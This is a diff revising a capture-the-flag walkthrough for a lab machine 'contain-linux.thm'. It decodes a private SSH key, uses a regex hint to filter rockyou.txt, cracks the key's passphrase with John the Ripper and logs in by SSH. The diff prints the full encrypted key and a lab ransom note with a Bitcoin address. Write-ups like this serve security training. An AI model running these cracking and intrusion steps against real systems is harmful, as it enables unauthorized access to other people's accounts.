@@ -78,15 +78,11 @@ The retrieved file contains encoded data written in the Brainfuck esoteric langu
 
 The decoded string provides a private OpenSSH key. Save the decoded private OpenSSH key in the file `contain-linux.key` and restrict it to read permission for the owner.
 # Private OpenSSH Key
-The private OpenSSH key does not reveal any corresponding user. Thus, use the filename as username during the key's first usage.
+The private OpenSSH key does not reveal any corresponding user. Use it first by printing its accordant public OpenSSH key.
 
-`ssh -i contain-linux.key <redacted>@contain-linux.thm` (Attacker Machine)
+`ssh-keygen -y -f contain-linux.key` (Attacker Machine)
 <pre>
-The authenticity of host 'contain-linux.thm (10.10.214.82)' can't be established.
-ECDSA key fingerprint is SHA256:TacqfIcOT2jMwLPHRQFjL8Hgjcn4tGlPz/5F8DRz6Zc.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'contain-linux.thm' (ECDSA) to the list of known hosts.
-Enter passphrase for key 'contain-linux.key':
+Enter passphrase: 
 </pre>
 The usage of the private OpenSSH key prompts for a passphrase. Convert the private OpenSSH key to a John-compatible hash and catch a glimpse of it.
 
@@ -100,37 +96,95 @@ Run a wordlist attack with John and `rockyou.txt`.
 
 `john --wordlist=/usr/share/wordlists/rockyou.txt contain-linux.hash` (Attacker Machine)
 <pre>
-Note: This format may emit false positives, so it will keep trying even after finding a
-possible candidate.
-Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
-Use the "--format=ssh-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
-Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
 Cost 2 (iteration count) is 24 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 </pre>
-Since this worklist attack would obviously take a long time to finish, abort it, reverse the lines in `rockyou.txt`, and relaunch the wordlist attack.
+Retrieving John's status by pressing any key apart from `q` or `Ctrl-C` reveals a too long time to finish. A second glimpse of `contain-linux.key` reveals a useful hint in the last line.
 
-`tac /usr/share/wordlists/rockyou.txt > /tmp/rockyou.txt` (Attacker Machine)
+`cat contain-linux.key` (Attacker Machine)
+<pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDOHzsthy
+wCbz8nB8TS+Tb4AAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGGTBRDg2Vu9Hbgh
+FK9xV6B+X0PuBR9cVbQWAwWfycuQAAAAoJMrS011drDHRD8w0ODpvGp3lG2jUpL0seDcub
+hha5GvXfvaOD8LVIdBa2ZPD44QCcZcjVUnwntt6ie6uOe/ycA0DPTRW60sD1n6xK6Pt/Bb
+uXquuMelZt1mtOrunIeT/q3re0+vzRyAHRQkNGFRVbP4l4seXsNnQ98P7hDMSpwkQI7ZXS
+96ZVWUKUaK9z/MjKafNb7CU8RurjAt1d7QuAE=
+-----END OPENSSH PRIVATE KEY-----
+^[0-9]{2}[a-z]{7}$
+</pre>
+It seems to be a regular expression applicable to `rockyou.txt`.
+
+`grep -E "^[0-9]{2}[a-z]{7}$" /usr/share/wordlists/rockyou.txt > /tmp/rockyou.txt`
+
+Launch another wordlist attack with John and the shaped `rockyou.txt`.
 
 `john --wordlist=/tmp/rockyou.txt contain-linux.hash` (Attacker Machine)
 <pre>
-Note: This format may emit false positives, so it will keep trying even after finding a
-possible candidate.
-Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
-Use the "--format=ssh-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
-Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
 Cost 2 (iteration count) is 24 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
+&lt;redacted&gt;        (?)     
+1g 0:00:21:39 DONE 0.000769g/s 8.185p/s 8.185c/s 8.185C/s 11defense..11clifton
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
 </pre>
-The second attack outputs the correct passphrase after a while. Accessing `contain-linux.thm` through the recent ssh command and the descried passphrase succeeds.
+The second attack outputs the correct passphrase after a while. Use the private OpenSSH key again by printing its accordant public OpenSSH key.
+
+`ssh-keygen -y -f contain-linux.key` (Attacker Machine)
+<pre>
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGGTBRDg2Vu9HbghFK9xV6B+X0PuBR9cVbQWAwWfycuQ &lt;redacted&gt;@contain-linux
+</pre>
+
+The comment of the public OpenSSH key reveals the username for initial access. Access `contain-linux.thm` with SSH, the private OpenSSH key and its passphrase.
 
 `ssh -i contain-linux.key <redacted>@contain-linux.thm` (Attacker Machine)
+<pre>
+The authenticity of host 'contain-linux.thm' can't be established.
+ECDSA key fingerprint is SHA256:TacqfIcOT2jMwLPHRQFjL8Hgjcn4tGlPz/5F8DRz6Zc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'contain-linux.thm' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'contain-linux.key': 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-161-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Sun Nov  2 19:25:49 2025 from 10.0.2.2
+......
+***** Your Files Have Been Encrypted *****
+
+Oops! Some files in your home directory have been encrypted using strong cryptography.
+
+What happened?
+- Your important files are now inaccessible.
+- Attempting to modify or recover your files without the proper decryption key will result in permanent data loss.
+
+How to recover your files?
+- Send payment of 1 BTC to the following address: bc1qhv6m5ssfldakjvdn4r9vtfqskjscfleefpn2v3
+- E-mail your proof of payment and your unique ID: contain.linux@gmail.com
+- After verification, you will receive the decryption instructions.
+
+What you must NOT do?
+- Turn off your computer.
+- Try to recover or modify encrypted files.
+- Seek help from third parties before contacting us.
+
+Deadline:
+- If we do not receive payment within two hours, your decryption key will be destroyed and your files will be lost forever.
+</pre>
 # `user.txt`
 Find and the expected file `user.txt` inside the home directory.
 
